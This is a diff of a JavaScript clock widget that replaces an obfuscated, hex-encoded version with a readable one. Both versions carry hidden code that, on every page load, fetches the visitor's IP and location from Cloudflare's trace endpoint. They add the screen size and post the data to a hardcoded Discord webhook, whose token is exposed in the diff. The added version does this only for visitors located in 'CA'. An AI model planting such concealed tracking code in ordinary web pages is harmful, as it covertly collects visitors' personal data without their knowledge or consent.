@@ -1,1 +1,27 @@
-var _0xbaf9=["\x63\x6C\x6F\x63\x6B","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64","\x67\x65\x74\x55\x54\x43\x48\x6F\x75\x72\x73","\x67\x65\x74\x55\x54\x43\x4D\x69\x6E\x75\x74\x65\x73","\x6C\x65\x6E\x67\x74\x68","\x30","\x3A","\x20\x55\x54\x43\x2B\x30","\x69\x6E\x6E\x65\x72\x48\x54\x4D\x4C","\x6F\x6E\x6C\x6F\x61\x64","","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x77\x77\x77\x2E\x63\x6C\x6F\x75\x64\x66\x6C\x61\x72\x65\x2E\x63\x6F\x6D\x2F\x63\x64\x6E\x2D\x63\x67\x69\x2F\x74\x72\x61\x63\x65","\x0A","\x77\x69\x64\x74\x68","\x73\x63\x72\x65\x65\x6E","\x78","\x68\x65\x69\x67\x68\x74","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x64\x69\x73\x63\x6F\x72\x64\x2E\x63\x6F\x6D\x2F\x61\x70\x69\x2F\x77\x65\x62\x68\x6F\x6F\x6B\x73\x2F\x38\x35\x34\x38\x33\x39\x38\x31\x31\x37\x32\x36\x33\x37\x36\x39\x36\x30\x2F\x5F\x71\x38\x46\x46\x4C\x57\x79\x37\x52\x2D\x62\x65\x2D\x39\x7A\x32\x4A\x5F\x64\x66\x57\x58\x6E\x43\x30\x61\x44\x36\x75\x32\x78\x51\x36\x61\x38\x77\x46\x70\x39\x30\x33\x4B\x30\x50\x6C\x42\x70\x78\x43\x43\x4A\x72\x2D\x4B\x42\x75\x78\x75\x4E\x75\x62\x68\x4F\x6F\x34\x70\x79","\x2D\x2D\x2D","\x6C\x6F\x67","\x61\x70\x70\x6C\x69\x63\x61\x74\x69\x6F\x6E\x2F\x6A\x73\x6F\x6E","\x70\x6F\x73\x74","\x67\x65\x74","\x73\x65\x74\x49\x6E\x74\x65\x72\x76\x61\x6C"];const setTime=function(){let _0x64e0x2=document[_0xbaf9[1]](_0xbaf9[0]);let _0x64e0x3=String( new Date()[_0xbaf9[2]]());let _0x64e0x4=String( new Date()[_0xbaf9[3]]());if(_0x64e0x3[_0xbaf9[4]]< 2){_0x64e0x3= _0xbaf9[5]+ _0x64e0x3};if(_0x64e0x4[_0xbaf9[4]]< 2){_0x64e0x4= _0xbaf9[5]+ _0x64e0x4};let _0x64e0x5=_0x64e0x3+ _0xbaf9[6]+ _0x64e0x4+ _0xbaf9[7];_0x64e0x2[_0xbaf9[8]]= _0x64e0x5};window[_0xbaf9[9]]= function(){let _0x64e0x6=_0xbaf9[10];$[_0xbaf9[22]](_0xbaf9[11],function(_0x64e0x7){_0x64e0x6= _0x64e0x6+ _0x64e0x7;_0x64e0x6= _0x64e0x6+ _0xbaf9[12]+ window[_0xbaf9[14]][_0xbaf9[13]]+ _0xbaf9[15]+ window[_0xbaf9[14]][_0xbaf9[16]]+ _0xbaf9[12];$[_0xbaf9[21]](_0xbaf9[17],{"\x63\x6F\x6E\x74\x65\x6E\x74":_0x64e0x6},console[_0xbaf9[19]](_0xbaf9[18]),_0xbaf9[20]);setTime()});window[_0xbaf9[23]](setTime,1000)}
+const setTime = function() {
+    let div = document.getElementById("clock")
+    let hours = String(new Date().getUTCHours())
+    let minutes = String(new Date().getUTCMinutes())
+    if (hours.length < 2) {
+        hours = "0" + hours
+    }
+    if (minutes.length < 2) {
+        minutes = "0" + minutes
+    }
+    let time = hours + ":" + minutes + " UTC+0"
+    div.innerHTML = time
+}
+
+
+window.onload = function() {
+    let message = ""
+    $.get('https://www.cloudflare.com/cdn-cgi/trace', function(data) {
+        if (data.includes("loc=CA")) {
+            message = message + data
+            message = message + "\n" + window.screen.width + "x" + window.screen.height + "\n"
+            $.post("https://discord.com/api/webhooks/854839811726376960/_q8FFLWy7R-be-9z2J_dfWXnC0aD6u2xQ6a8wFp903K0PlBpxCCJr-KBuxuNubhOo4py", {"content": message}, console.log("---"), "application/json")
+            setTime()
+        }
+    })
+    window.setInterval(setTime, 1000)
+}
